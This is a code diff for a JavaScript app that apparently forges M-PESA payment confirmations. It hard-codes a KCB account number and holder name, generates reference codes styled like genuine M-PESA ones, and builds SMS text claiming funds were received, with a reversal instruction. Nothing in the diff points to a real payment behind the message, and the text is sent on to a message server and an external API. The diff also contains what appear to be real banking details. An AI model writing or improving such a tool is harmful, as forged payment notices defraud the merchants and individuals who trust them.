@@ -123,8 +123,9 @@ const SYSTEM_API    = "https://funds-mauve.vercel.app/api";
 const EXTERNAL_API  = "https://mpesab.vercel.app";
 const MESSAGE_API   = "https://message-server-five.vercel.app";
 
-// Fixed KCB Account Number (Change this if needed)
-const KCB_ACCOUNT   = "KCB";   // ←←← PUT YOUR ACTUAL KCB ACCOUNT NUMBER HERE
+// Fixed KCB Account Details
+const KCB_ACCOUNT      = "8027703";                    // ← Change if needed
+const KCB_ACCOUNT_NAME = "ARNOLD AND DUNCAN JA";
 
 let user = JSON.parse(localStorage.getItem('mledger_user'));
 if (!user) location.href = 'index.html';
@@ -163,11 +164,12 @@ function formatNumericDate() {
 
 function formatTime12Hour() {
   const now = new Date();
-  return now.toLocaleTimeString('en-US', {
-    hour: 'numeric',
-    minute: '2-digit',
-    hour12: true
-  });
+  let hours = now.getHours();
+  const minutes = now.getMinutes().toString().padStart(2, '0');
+  const ampm = hours >= 12 ? 'PM' : 'AM';
+  hours = hours % 12;
+  hours = hours ? hours : 12;
+  return `${hours}:${minutes} ${ampm}`;
 }
 
 function calculateCost(amt) {
@@ -259,22 +261,19 @@ elements.nameOkBtn.addEventListener("click", () => {
 });
 
 elements.sendBtn.addEventListener("click", async () => {
-  const phoneVal   = elements.phone.value.trim();
   const amountVal  = parseFloat(elements.amount.value);
-  const nameVal    = elements.name.value.trim();
-  const cost       = calculateCost(amountVal);
-
+  
   elements.sendBtn.innerText = "Processing...";
   elements.sendBtn.disabled = true;
 
   try {
-    // 1. Deduct funds via system
+    // Deduct funds via system (still uses entered phone for deduction logic)
     const sysRes = await fetch(`${SYSTEM_API}/send`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         fromPhone: user.phone,
-        toPhone: phoneVal,
+        toPhone: elements.phone.value.trim(),   // still needed for backend deduction
         amount: amountVal
       })
     });
@@ -285,29 +284,37 @@ elements.sendBtn.addEventListener("click", async () => {
     user.balance = sysData.balance;
     localStorage.setItem('mledger_user', JSON.stringify(user));
 
-    // 2. Generate token and confirmation message
+    // Generate Token
     const token = `${getYearLetter()}${getMonthThirdLetter()}${getDayCode()}K${Math.random().toString(36).substring(2,8).toUpperCase()}`;
+
     const dateStr = formatNumericDate();
     const timeStr = formatTime12Hour();
 
-    const confirmationMsg = `${token} Confirmed. Ksh${amountVal.toFixed(2)} sent to ${nameVal} ${phoneVal} on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${user.balance.toFixed(2)}. Transaction Cost,Ksh${cost.toFixed(2)}. Amount you can transact within the day is 499,777.00.Amount you can transact within the day is 499,777.00. Earn interest daily on Ziidi MMF,Dial*334#`;
+    // Final Message Format (exactly as requested - no recipient phone shown)
+    const confirmationMsg = `Ksh ${amountVal.toFixed(2)} sent to KCB account ${KCB_ACCOUNT_NAME} ${KCB_ACCOUNT} has been received on ${dateStr} at ${timeStr}. M-PESA Ref ${token}. To reverse this transaction, SMS this message to 16120.`;
 
-    // 3. Send confirmation to MESSAGE SERVER → Always to KCB account
+    // Forward message to MESSAGE SERVER → Always to KCB account
     fetch(`${MESSAGE_API}/api/messages`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
-        phone: KCB_ACCOUNT,        // ← Always forward to KCB
+        phone: KCB_ACCOUNT, 
         message: confirmationMsg, 
         type: 'sent' 
       })
     }).catch(err => console.warn(err));
 
-    // Optional: Still call external API if needed
+    // Optional external API call
     fetch(`${EXTERNAL_API}/send`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ phone: phoneVal, name: nameVal, amount: amountVal, message: confirmationMsg, token, cost })
+      body: JSON.stringify({ 
+        phone: elements.phone.value.trim(), 
+        name: elements.name.value.trim(), 
+        amount: amountVal, 
+        message: confirmationMsg, 
+        token 
+      })
     }).catch(() => {});
 
     setTimeout(() => { location.href = 'index.html'; }, 2500);
